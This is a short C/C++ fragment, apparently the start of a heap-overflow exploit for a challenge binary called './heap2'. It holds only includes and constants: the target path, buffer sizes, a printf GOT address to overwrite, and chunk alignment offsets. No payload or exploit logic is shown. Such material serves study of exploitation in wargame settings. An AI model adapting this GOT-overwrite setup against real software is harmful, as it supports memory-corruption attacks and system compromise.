#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <iostream>

using namespace std;

#define VULN "./heap2"

#define XLEn 1040 
#define ENVPTRZ 512 

#define PRINTF_GOT 0x80409648 

#define CHUNK_ENV_ALLIGN 17 
#define CHUNK_ENV_OFFSET 1056-1024



